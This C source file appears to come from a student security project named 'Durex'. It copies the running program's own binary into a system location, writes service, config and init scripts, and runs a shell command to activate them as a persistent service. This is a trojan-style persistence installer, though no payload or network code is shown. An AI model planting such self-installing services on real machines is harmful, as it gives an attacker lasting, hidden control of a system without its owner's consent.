/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
/*   Updated: 2018/07/24 20:27:59 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* mmap */
#include <sys/mman.h>
#include <stdio.h>
#include "main.h"

static int	install_error(int fd)
{
	if (fd >= 0)
		close(fd);
	remove(DUREX_BINARY_FILE);
	remove(DUREX_SERVICE_FILE);
	remove(DUREX_CONF_FILE);
	remove(DUREX_INIT_FILE);
	return 1;
}

int			install_binary(const char *prog)
{
	int		durex;
	int		bin;
	void	*data;
	int		size;

	bin = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
	if (bin < 0)
		return install_error(bin);
	if ((durex = open(prog, O_RDONLY)) == -1)
		return install_error(bin);
	size = lseek(durex, 1, SEEK_END);
	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, durex, 0);
	close(durex);
	if (size == -1 || data == MAP_FAILED)
		return install_error(bin);
	write(bin, data, size);
	close(bin);
	munmap(data, size);
	return install_service();
}

int			install_service()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_SERVICE_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
	if (fd < 0)
		return install_error(-1);
	ret = write(fd, DUREX_SERVICE_SCRIPT, sizeof(DUREX_SERVICE_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_SERVICE_SCRIPT))
		return install_error(-1);
	return install_conf();
}

int			install_conf()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_CONF_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
	if (fd < 0)
		return 1;
	ret = write(fd, DUREX_CONF_SCRIPT, sizeof(DUREX_CONF_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_CONF_SCRIPT))
		return 1;
	return install_init();
}

int			install_init()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_INIT_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0755);
	if (fd < 0)
		return install_error(-1);
	ret = write(fd, DUREX_INIT_SCRIPT, sizeof(DUREX_INIT_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_INIT_SCRIPT))
		return install_error(-1);
	system(DUREX_ACTIVATE_SCRIPT);
	return 1;
}
